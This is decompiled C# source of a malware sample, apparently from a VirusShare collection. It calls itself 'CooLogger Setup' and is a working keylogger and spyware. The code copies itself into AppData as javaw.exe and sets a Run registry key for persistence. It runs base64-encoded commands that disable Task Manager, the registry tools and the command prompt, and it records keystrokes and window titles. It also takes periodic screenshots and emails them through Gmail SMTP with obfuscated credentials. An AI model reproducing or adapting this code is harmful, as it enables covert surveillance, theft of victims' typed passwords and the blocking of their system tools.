// Decompiled with JetBrains decompiler
// Type: eVuKCmUWrUYmwRf
// Assembly: CooLogger Setup v3.2, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: F3D1EA50-2213-48BF-B700-67DF9B6A4071
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00041-msil\Trojan-Ransom.Win32.Blocker.hfgu-0d0af29634578ca3e548a3e7d1d405c09242ee3825ddf8c1ef1e001713b226bf.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using My;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

[StandardModule]
internal sealed class eVuKCmUWrUYmwRf
{
  private static string SFfCBdKcOSrSdXp = "aWs4YXNaZVFURFdBUUdxdU5oVitVWXZ4bWNJQ0VJemM=";
  private static string mJfEvrEUjFsCZUx = "PXdYOVBCSEJmdHd1PU9VV0lwNE4vSGsy";
  private static string zgBGOEjrsqvTahM = "smtp.gmail.com";
  private static int YYnrulLaTDknIko = 587;
  private static string VuKCmUWrUYmwRfS;
  private static string FfCBdKcOSrSdXpm;
  private static string JfEvrEUjFsCZUxz;
  private static string gBGOEjrsqvTahMY;
  private static string YnrulLaTDknIkoD;
  private static string xmSbcafQKRuIHXb;
  private static int itnGpMvGMIUlzIJ = 900000;
  private static string MiuJqItxYMKEWTp = (string) null;
  private static string UYaSrHyjRTnQVit = "UkVHIGFkZCBIS0NVXFNvZnR3YXJlXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXFN5c3RlbSAvdiBEaXNhYmxlQ01EIC90IFJFR19EV09SRCAvZCAxIC9m";
  private static string ObPBcyxZHYLPoPa = "UkVHIGFkZCBIS0NVXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFBvbGljaWVzXFN5c3RlbSAvdiBEaXNhYmxlUmVnaXN0cnlUb29scyAvdCBSRUdfRFdPUkQgL2QgMSAvZg==";
  private static string UmjGcBsoBRgCpyW = "UkVHIGFkZCBIS0NVXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFBvbGljaWVzXFN5c3RlbSAvdiBEaXNhYmxlVGFza01nciAvdCBSRUdfRFdPUkQgL2QgMSAvZg==";
  private static object DyivVVvFRtNsQiI = (object) Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
  private static string SpkOQwDWeUzuvty = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
  private static MailMessage jqxOooEuwoOqVTB = new MailMessage();
  private static SmtpClient HlWSGaRIWgPOCoP = new SmtpClient();
  [AccessedThroughProperty("lWSGaRIWgPOCoPl")]
  private static lxMtLxCbPNHZWsP _lWSGaRIWgPOCoPl;
  private static object pBETopzJEhwQjDx;
  private static RichTextBox bEiTODXOFSdMLyk;
  private static object qvgnuLlkBqtlKnS;
  private static readonly byte[] key;
  private static readonly byte[] iv;
  private static RuwdwDLzfopnsQX eIVUkoqiIXPzhjF;

  static eVuKCmUWrUYmwRf()
  {
    eVuKCmUWrUYmwRf.lWSGaRIWgPOCoPl = new lxMtLxCbPNHZWsP();
    eVuKCmUWrUYmwRf.pBETopzJEhwQjDx = (object) Path.GetFileName(Conversions.ToString(eVuKCmUWrUYmwRf.qvgnuLlkBqtlKnS));
    eVuKCmUWrUYmwRf.bEiTODXOFSdMLyk = new RichTextBox();
    eVuKCmUWrUYmwRf.qvgnuLlkBqtlKnS = (object) Application.ExecutablePath;
    eVuKCmUWrUYmwRf.key = new byte[24]
    {
      (byte) 1,
      (byte) 2,
      (byte) 3,
      (byte) 4,
      (byte) 5,
      (byte) 6,
      (byte) 7,
      (byte) 8,
      (byte) 9,
      (byte) 10,
      (byte) 11,
      (byte) 12,
      (byte) 13,
      (byte) 14,
      (byte) 15,
      (byte) 16,
      (byte) 17,
      (byte) 18,
      (byte) 19,
      (byte) 20,
      (byte) 21,
      (byte) 22,
      (byte) 23,
      (byte) 24
    };
    eVuKCmUWrUYmwRf.iv = new byte[8]
    {
      (byte) 8,
      (byte) 7,
      (byte) 6,
      (byte) 5,
      (byte) 4,
      (byte) 3,
      (byte) 2,
      (byte) 1
    };
    eVuKCmUWrUYmwRf.eIVUkoqiIXPzhjF = new RuwdwDLzfopnsQX(eVuKCmUWrUYmwRf.key, eVuKCmUWrUYmwRf.iv);
  }

  private static lxMtLxCbPNHZWsP lWSGaRIWgPOCoPl
  {
    get => eVuKCmUWrUYmwRf._lWSGaRIWgPOCoPl;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      if (eVuKCmUWrUYmwRf._lWSGaRIWgPOCoPl != null)
        lxMtLxCbPNHZWsP.KeyDown -= new lxMtLxCbPNHZWsP.KeyDownEventHandler(eVuKCmUWrUYmwRf.beVuKCmUWrUYmwR);
      eVuKCmUWrUYmwRf._lWSGaRIWgPOCoPl = value;
      if (eVuKCmUWrUYmwRf._lWSGaRIWgPOCoPl == null)
        return;
      lxMtLxCbPNHZWsP.KeyDown += new lxMtLxCbPNHZWsP.KeyDownEventHandler(eVuKCmUWrUYmwRf.beVuKCmUWrUYmwR);
    }
  }

  [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int GetForegroundWindow();

  [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int gyLywqJGcMXcZkC(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

  [STAThread]
  public static void main()
  {
    eVuKCmUWrUYmwRf.lWSGaRIWgPOCoPl.ntpBETopzJEhwQj();
    eVuKCmUWrUYmwRf.xmSbcafQKRuIHXb = Conversions.ToString(true);
    eVuKCmUWrUYmwRf.JfEvrEUjFsCZUxz = Conversions.ToString(true);
    eVuKCmUWrUYmwRf.gBGOEjrsqvTahMY = Conversions.ToString(true);
    eVuKCmUWrUYmwRf.YnrulLaTDknIkoD = Conversions.ToString(true);
    eVuKCmUWrUYmwRf.FfCBdKcOSrSdXpm = Conversions.ToString(true);
    eVuKCmUWrUYmwRf.VuKCmUWrUYmwRfS = Conversions.ToString(true);
    if (!Operators.ConditionalCompareObjectEqual((object) Application.StartupPath, eVuKCmUWrUYmwRf.DyivVVvFRtNsQiI, false))
    {
      using (System.IO.File.Create(Conversions.ToString(Operators.ConcatenateObject(eVuKCmUWrUYmwRf.DyivVVvFRtNsQiI, (object) "\\qxOooEuwoOqVTBp.txt"))))
        ;
      StreamWriter streamWriter = new StreamWriter(eVuKCmUWrUYmwRf.SpkOQwDWeUzuvty + "\\qxOooEuwoOqVTBp.txt");
      streamWriter.Write(RuntimeHelpers.GetObjectValue(eVuKCmUWrUYmwRf.qvgnuLlkBqtlKnS));
      streamWriter.Flush();
      streamWriter.Close();
      if (System.IO.File.Exists(Conversions.ToString(Operators.AddObject(eVuKCmUWrUYmwRf.DyivVVvFRtNsQiI, (object) "\\javaw.exe"))))
      {
        MyProject.Computer.FileSystem.DeleteFile(Conversions.ToString(Operators.AddObject(eVuKCmUWrUYmwRf.DyivVVvFRtNsQiI, (object) "\\javaw.exe")));
        MyProject.Computer.FileSystem.CopyFile(Conversions.ToString(eVuKCmUWrUYmwRf.qvgnuLlkBqtlKnS), Conversions.ToString(Operators.AddObject(eVuKCmUWrUYmwRf.DyivVVvFRtNsQiI, (object) "\\javaw.exe")));
      }
      else
        MyProject.Computer.FileSystem.CopyFile(Conversions.ToString(eVuKCmUWrUYmwRf.qvgnuLlkBqtlKnS), Conversions.ToString(Operators.AddObject(eVuKCmUWrUYmwRf.DyivVVvFRtNsQiI, (object) "\\javaw.exe")));
      NewLateBinding.LateCall((object) null, typeof (Process), "Start", new object[1]
      {
        Operators.AddObject(eVuKCmUWrUYmwRf.DyivVVvFRtNsQiI, (object) "\\javaw.exe")
      }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
      ProjectData.EndApp();
    }
    if (Conversions.ToBoolean(eVuKCmUWrUYmwRf.VuKCmUWrUYmwRfS) && RuntimeHelpers.GetObjectValue(Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).GetValue(Conversions.ToString(eVuKCmUWrUYmwRf.pBETopzJEhwQjDx))) == null)
      MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", Conversions.ToString(eVuKCmUWrUYmwRf.pBETopzJEhwQjDx), Operators.ConcatenateObject(Operators.ConcatenateObject(eVuKCmUWrUYmwRf.DyivVVvFRtNsQiI, (object) "\\"), eVuKCmUWrUYmwRf.pBETopzJEhwQjDx));
    if (Conversions.ToBoolean(eVuKCmUWrUYmwRf.FfCBdKcOSrSdXpm))
    {
      try
      {
        MyProject.Computer.FileSystem.DeleteFile(Conversions.ToString((object) MyProject.Computer.FileSystem.ReadAllText(Conversions.ToString(Operators.ConcatenateObject(eVuKCmUWrUYmwRf.DyivVVvFRtNsQiI, (object) "\\qxOooEuwoOqVTBp.txt")))));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
    if (Conversions.ToBoolean(eVuKCmUWrUYmwRf.JfEvrEUjFsCZUxz))
      Interaction.Shell(eVuKCmUWrUYmwRf.bPBcyxZHYLPoPaU(eVuKCmUWrUYmwRf.UYaSrHyjRTnQVit), AppWinStyle.NormalFocus);
    if (Conversions.ToBoolean(eVuKCmUWrUYmwRf.gBGOEjrsqvTahMY))
      Interaction.Shell(eVuKCmUWrUYmwRf.bPBcyxZHYLPoPaU(eVuKCmUWrUYmwRf.ObPBcyxZHYLPoPa), AppWinStyle.NormalFocus);
    if (Conversions.ToBoolean(eVuKCmUWrUYmwRf.YnrulLaTDknIkoD))
      Interaction.Shell(eVuKCmUWrUYmwRf.bPBcyxZHYLPoPaU(eVuKCmUWrUYmwRf.UmjGcBsoBRgCpyW), AppWinStyle.NormalFocus);
    System.Windows.Forms.Timer timer1 = new System.Windows.Forms.Timer();
    timer1.Interval = 900000;
    timer1.Tick += new EventHandler(eVuKCmUWrUYmwRf.xMtLxCbPNHZWsPn_Ticked);
    timer1.Start();
    System.Windows.Forms.Timer timer2 = new System.Windows.Forms.Timer();
    timer2.Interval = 300;
    timer2.Tick += new EventHandler(eVuKCmUWrUYmwRf.tpBETopzJEhwQjD_Ticked);
    timer2.Start();
    Application.Run();
  }

  private static string DYZiHnRgNTmukQL()
  {
    string lpString = new string(char.MinValue, 100);
    eVuKCmUWrUYmwRf.gyLywqJGcMXcZkC(eVuKCmUWrUYmwRf.GetForegroundWindow(), ref lpString, 100);
    return lpString.Substring(0, checked (Strings.InStr(lpString, "\0") - 1));
  }

  public static string bPBcyxZHYLPoPaU(string IVUkoqiIXPzhjFh) => Encoding.ASCII.GetString(Convert.FromBase64String(IVUkoqiIXPzhjFh));

  public static void xMtLxCbPNHZWsPn_Ticked(object sender, EventArgs e)
  {
    if (Conversions.ToBoolean(eVuKCmUWrUYmwRf.xmSbcafQKRuIHXb))
    {
      Size blockRegionSize = new Size(MyProject.Computer.Screen.Bounds.Width, MyProject.Computer.Screen.Bounds.Height);
      Bitmap bitmap = new Bitmap(MyProject.Computer.Screen.Bounds.Width, MyProject.Computer.Screen.Bounds.Height);
      Graphics.FromImage((Image) bitmap).CopyFromScreen(new Point(0, 0), new Point(0, 0), blockRegionSize);
      string Right = eVuKCmUWrUYmwRf.gzujPYZXcNGNrFE(6);
      bitmap.Save(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(eVuKCmUWrUYmwRf.DyivVVvFRtNsQiI, (object) "\\"), (object) Right), (object) ".jpeg")));
      try
      {
        MailMessage message = new MailMessage();
        Attachment attachment = new Attachment(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(eVuKCmUWrUYmwRf.DyivVVvFRtNsQiI, (object) "\\"), (object) Right), (object) ".jpeg")));
        message.From = new MailAddress(eVuKCmUWrUYmwRf.eIVUkoqiIXPzhjF.hlzvesRSsCOqKoN(eVuKCmUWrUYmwRf.fFfqkDlJsDJFRhw(eVuKCmUWrUYmwRf.bPBcyxZHYLPoPaU(eVuKCmUWrUYmwRf.SFfCBdKcOSrSdXp))));
        message.To.Add(eVuKCmUWrUYmwRf.eIVUkoqiIXPzhjF.hlzvesRSsCOqKoN(eVuKCmUWrUYmwRf.fFfqkDlJsDJFRhw(eVuKCmUWrUYmwRf.bPBcyxZHYLPoPaU(eVuKCmUWrUYmwRf.SFfCBdKcOSrSdXp))));
        message.Subject = "COOLogger Logs From - " + Environment.UserName;
        message.Body = eVuKCmUWrUYmwRf.bEiTODXOFSdMLyk.Text;
        message.Attachments.Add(attachment);
        SmtpClient smtpClient = new SmtpClient("smtp.gmail.com")
        {
          Port = 587,
          EnableSsl = true,
          Credentials = (ICredentialsByHost) new NetworkCredential(eVuKCmUWrUYmwRf.eIVUkoqiIXPzhjF.hlzvesRSsCOqKoN(eVuKCmUWrUYmwRf.fFfqkDlJsDJFRhw(eVuKCmUWrUYmwRf.bPBcyxZHYLPoPaU(eVuKCmUWrUYmwRf.SFfCBdKcOSrSdXp))), eVuKCmUWrUYmwRf.eIVUkoqiIXPzhjF.hlzvesRSsCOqKoN(eVuKCmUWrUYmwRf.fFfqkDlJsDJFRhw(eVuKCmUWrUYmwRf.bPBcyxZHYLPoPaU(eVuKCmUWrUYmwRf.mJfEvrEUjFsCZUx))))
        };
        smtpClient.EnableSsl = true;
        smtpClient.Send(message);
        eVuKCmUWrUYmwRf.bEiTODXOFSdMLyk.Text = "";
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
    else
    {
      MailMessage jqxOooEuwoOqVtb = eVuKCmUWrUYmwRf.jqxOooEuwoOqVTB;
      jqxOooEuwoOqVtb.From = new MailAddress(eVuKCmUWrUYmwRf.eIVUkoqiIXPzhjF.hlzvesRSsCOqKoN(eVuKCmUWrUYmwRf.fFfqkDlJsDJFRhw(eVuKCmUWrUYmwRf.bPBcyxZHYLPoPaU(eVuKCmUWrUYmwRf.SFfCBdKcOSrSdXp))));
      jqxOooEuwoOqVtb.To.Add(eVuKCmUWrUYmwRf.eIVUkoqiIXPzhjF.hlzvesRSsCOqKoN(eVuKCmUWrUYmwRf.fFfqkDlJsDJFRhw(eVuKCmUWrUYmwRf.bPBcyxZHYLPoPaU(eVuKCmUWrUYmwRf.SFfCBdKcOSrSdXp))));
      jqxOooEuwoOqVtb.Subject = "COOLogger Logs from - " + Environment.UserName;
      jqxOooEuwoOqVtb.Body = eVuKCmUWrUYmwRf.bEiTODXOFSdMLyk.Text;
      SmtpClient hlWsGaRiWgPoCoP = eVuKCmUWrUYmwRf.HlWSGaRIWgPOCoP;
      hlWsGaRiWgPoCoP.Host = "smtp.gmail.com";
      hlWsGaRiWgPoCoP.Port = 587;
      hlWsGaRiWgPoCoP.EnableSsl = true;
      hlWsGaRiWgPoCoP.Credentials = (ICredentialsByHost) new NetworkCredential(eVuKCmUWrUYmwRf.eIVUkoqiIXPzhjF.hlzvesRSsCOqKoN(eVuKCmUWrUYmwRf.fFfqkDlJsDJFRhw(eVuKCmUWrUYmwRf.bPBcyxZHYLPoPaU(eVuKCmUWrUYmwRf.SFfCBdKcOSrSdXp))), eVuKCmUWrUYmwRf.eIVUkoqiIXPzhjF.hlzvesRSsCOqKoN(eVuKCmUWrUYmwRf.fFfqkDlJsDJFRhw(eVuKCmUWrUYmwRf.bPBcyxZHYLPoPaU(eVuKCmUWrUYmwRf.mJfEvrEUjFsCZUx))));
      hlWsGaRiWgPoCoP.Send(eVuKCmUWrUYmwRf.jqxOooEuwoOqVTB);
      eVuKCmUWrUYmwRf.bEiTODXOFSdMLyk.Text = "";
    }
  }

  public static void beVuKCmUWrUYmwR(Keys e) => eVuKCmUWrUYmwRf.bEiTODXOFSdMLyk.Text += eVuKCmUWrUYmwRf.lWSGaRIWgPOCoPl.DxmSbcafQKRuIHX(e);

  public static void tpBETopzJEhwQjD_Ticked(object sender, EventArgs e)
  {
    if (Operators.CompareString(eVuKCmUWrUYmwRf.MiuJqItxYMKEWTp, eVuKCmUWrUYmwRf.DYZiHnRgNTmukQL(), false) == 0)
      return;
    eVuKCmUWrUYmwRf.MiuJqItxYMKEWTp = eVuKCmUWrUYmwRf.DYZiHnRgNTmukQL();
    if (Operators.CompareString(eVuKCmUWrUYmwRf.MiuJqItxYMKEWTp, "", false) == 0)
      return;
    RichTextBox bEiTodxofSdMlyk = eVuKCmUWrUYmwRf.bEiTODXOFSdMLyk;
    bEiTodxofSdMlyk.Text = bEiTodxofSdMlyk.Text + "\r\n\r\n~~~~~" + eVuKCmUWrUYmwRf.MiuJqItxYMKEWTp + " (" + DateAndTime.Now.ToLongTimeString() + ")~~~~~\r\n";
  }

  public static string gzujPYZXcNGNrFE(int lenght)
  {
    VBMath.Randomize();
    StringBuilder stringBuilder = new StringBuilder("");
    char[] charArray = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".ToCharArray();
    int num1 = lenght;
    int num2 = 1;
    while (num2 <= num1)
    {
      VBMath.Randomize();
      int index = checked ((int) Math.Round((double) unchecked (Conversion.Int((float) checked (charArray.Length - 2 - 0 + 1) * VBMath.Rnd()) + 1f)));
      stringBuilder.Append(charArray[index]);
      checked { ++num2; }
    }
    return stringBuilder.ToString();
  }

  public static string fFfqkDlJsDJFRhw(string sInput)
  {
    string str = "";
    int length = sInput.Length;
    int num1 = length % 2;
    int num2 = length / 2;
    int Start = checked (num2 + num1);
    while (Start >= 1)
    {
      if (num1 == 0)
        str += Strings.Mid(sInput, checked (Start + num2), 1);
      str += Strings.Mid(sInput, Start, 1);
      if (num1 == 1 & Start != 1)
        str += Strings.Mid(sInput, checked (Start + num2), 1);
      checked { Start += -1; }
    }
    return str;
  }
}
